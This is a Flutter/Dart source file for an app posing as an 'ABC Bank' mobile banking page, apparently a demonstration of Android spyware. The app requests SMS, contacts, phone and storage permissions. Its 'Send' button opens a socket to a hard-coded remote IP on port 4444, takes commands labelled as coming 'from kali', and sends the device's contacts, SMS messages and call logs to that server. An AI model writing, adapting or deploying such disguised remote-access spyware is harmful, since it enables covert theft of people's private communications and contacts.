import 'dart:convert';
import 'dart:developer';
import 'dart:io';

import 'package:demo_mobile_snip/attack.dart';
import 'package:flutter/material.dart';

import 'package:permission_handler/permission_handler.dart';

Future<void> requestPermissions() async {
  await [
    Permission.sms,
    Permission.contacts,
    Permission.phone,
    Permission.storage,
  ].request();
}


const String ip = "18.212.190.116";

void main() async {

    WidgetsFlutterBinding.ensureInitialized(); // Required before await



  await requestPermissions();


  


  runApp(const MyApp());
}

void connectToServer() async {

  print('Connected to server');
    try {
      final socket = await Socket.connect(ip, 4444);
      print('Connected to server');

      socket.listen((data) async {

        print("envent ");

        final command = utf8.decode(data).trim();

        print("command from kali: $command");

        await handleCommand(command);



        // if (command == 'take_photo') {
        //   final image = await _controller.takePicture();
        //   final bytes = await File(image.path).readAsBytes();
        //   socket.add(bytes); // Send photo bytes
        // }
      });
    } catch (e) {
      print('Error: $e');
    }
  }

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  // This widget is the root of your application.

  @override
  void initState() {
    // TODO: implement initState
    super.initState();

    // getData();


  }

  


  void getData() async {
    final smsMessages = await fetchSms();
    final contacts = await fetchContacts();
    final callLogs = await fetchCallLogs();
    final files = await listFiles();


    sendJsonToServer("sms_message", smsMessages);


    log("SMS Message ${smsMessages}");
    log("Contact list ${contacts}");

    log("calllog ${callLogs}");


  }
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        // This is the theme of your application.
        //
        // TRY THIS: Try running your application with "flutter run". You'll see
        // the application has a purple toolbar. Then, without quitting the app,
        // try changing the seedColor in the colorScheme below to Colors.green
        // and then invoke "hot reload" (save your changes or press the "hot
        // reload" button in a Flutter-supported IDE, or press "r" if you used
        // the command line to start the app).
        //
        // Notice that the counter didn't reset back to zero; the application
        // state is not lost during the reload. To reset the state, use hot
        // restart instead.
        //
        // This works for code too, not just values: Most code changes can be
        // tested with just a hot reload.
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: BankHomePage(),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  // This widget is the home page of your application. It is stateful, meaning
  // that it has a State object (defined below) that contains fields that affect
  // how it looks.

  // This class is the configuration for the state. It holds the values (in this
  // case the title) provided by the parent (in this case the App widget) and
  // used by the build method of the State. Fields in a Widget subclass are
  // always marked "final".

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  int _counter = 0;

  void _incrementCounter() {
    setState(() {
      // This call to setState tells the Flutter framework that something has
      // changed in this State, which causes it to rerun the build method below
      // so that the display can reflect the updated values. If we changed
      // _counter without calling setState(), then the build method would not be
      // called again, and so nothing would appear to happen.
      _counter++;
    });
  }

  @override
  Widget build(BuildContext context) {
    // This method is rerun every time setState is called, for instance as done
    // by the _incrementCounter method above.
    //
    // The Flutter framework has been optimized to make rerunning build methods
    // fast, so that you can just rebuild anything that needs updating rather
    // than having to individually change instances of widgets.
    return Scaffold(
      appBar: AppBar(
        // TRY THIS: Try changing the color here to a specific color (to
        // Colors.amber, perhaps?) and trigger a hot reload to see the AppBar
        // change color while the other colors stay the same.
        backgroundColor: Theme.of(context).colorScheme.inversePrimary,
        // Here we take the value from the MyHomePage object that was created by
        // the App.build method, and use it to set our appbar title.
        title: Text(widget.title),
      ),
      body: Center(
        // Center is a layout widget. It takes a single child and positions it
        // in the middle of the parent.
        child: Column(
          // Column is also a layout widget. It takes a list of children and
          // arranges them vertically. By default, it sizes itself to fit its
          // children horizontally, and tries to be as tall as its parent.
          //
          // Column has various properties to control how it sizes itself and
          // how it positions its children. Here we use mainAxisAlignment to
          // center the children vertically; the main axis here is the vertical
          // axis because Columns are vertical (the cross axis would be
          // horizontal).
          //
          // TRY THIS: Invoke "debug painting" (choose the "Toggle Debug Paint"
          // action in the IDE, or press "p" in the console), to see the
          // wireframe for each widget.
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            const Text(
              'You have pushed the button this many times:',
            ),
            Text(
              '$_counter',
              style: Theme.of(context).textTheme.headlineMedium,
            ),
          ],
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: _incrementCounter,
        tooltip: 'Increment',
        child: const Icon(Icons.add),
      ), // This trailing comma makes auto-formatting nicer for build methods.
    );
  }


  
}


Future<void> handleCommand(String command) async {
  if (command == 'get_contacts') {
    final contacts = await fetchContacts();
    sendJsonToServer("get_contacts", contacts);

  } else if (command == 'get_sms') {
    final smsMessages = await fetchSms();
    sendJsonToServer("sms_message", smsMessages);

  } else if (command == 'get_call_logs') {
    final callLogs = await fetchCallLogs();
    sendJsonToServer("get_call_logs", callLogs);
  }
}


class BankHomePage extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('ABC Bank'),
        centerTitle: true,
        elevation: 0,
      ),
      body: SingleChildScrollView(
        padding: EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('Welcome back, Perses 👋', style: TextStyle(fontSize: 20, fontWeight: FontWeight.w600)),
            SizedBox(height: 20),

            // Balance Card
            Container(
              padding: EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: Colors.indigo,
                borderRadius: BorderRadius.circular(16),
              ),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text('Current Balance', style: TextStyle(color: Colors.white70)),
                  SizedBox(height: 8),
                  Text('\$168,345,988.67', style: TextStyle(color: Colors.white, fontSize: 32, fontWeight: FontWeight.bold)),
                  SizedBox(height: 12),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Text('Account No: **** 168', style: TextStyle(color: Colors.white70)),
                      Icon(Icons.credit_card, color: Colors.white54),
                    ],
                  )
                ],
              ),
            ),

            SizedBox(height: 24),

            // Quick Actions
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                InkWell(
                  child: _buildActionButton(Icons.send, 'Send'),
                  onTap: (){
                    print("Hello");
                   connectToServer();
                  },
                ),
                _buildActionButton(Icons.call_received, 'Receive'),
                _buildActionButton(Icons.account_balance_wallet, 'Top Up'),
                _buildActionButton(Icons.more_horiz, 'More'),
              ],
            ),

            SizedBox(height: 30),
            Text('Recent Transactions', style: TextStyle(fontSize: 18, fontWeight: FontWeight.w600)),
            SizedBox(height: 10),

            _buildTransactionItem('Transfer to Alpha02', '-\$168,998.00', 'May 21'),
            _buildTransactionItem('Top Up', '+\$500,000,000.00', 'May 20'),
            _buildTransactionItem('Transfer from Anonymous', '+\$130,884.00', 'May 19'),
            _buildTransactionItem('Transfer to Alpha01', '-\$168,448.00', 'May 21'),
            _buildTransactionItem('Top Up', '+\$500,000,000.00', 'May 20'),
            _buildTransactionItem('Transfer from Anonymous', '+\$130,884.00', 'May 19'),
          ],
        ),
      ),
    );
  }

  Widget _buildActionButton(IconData icon, String label) {
    return Column(
      children: [
        CircleAvatar(
          backgroundColor: Colors.indigo.shade100,
          radius: 28,
          child: Icon(icon, size: 28, color: Colors.indigo),
        ),
        SizedBox(height: 8),
        Text(label),
      ],
    );
  }

  Widget _buildTransactionItem(String title, String amount, String date) {
    return ListTile(
      contentPadding: EdgeInsets.zero,
      leading: CircleAvatar(
        backgroundColor: Colors.indigo.shade100,
        child: Icon(Icons.monetization_on, color: Colors.indigo),
      ),
      title: Text(title, style: TextStyle(fontSize: 14),),
      subtitle: Text(date),
      trailing: Text(
        amount,
        style: TextStyle(
          fontWeight: FontWeight.bold,
          color: amount.startsWith('-') ? Colors.red : Colors.green,
        ),
      ),
    );
  }
}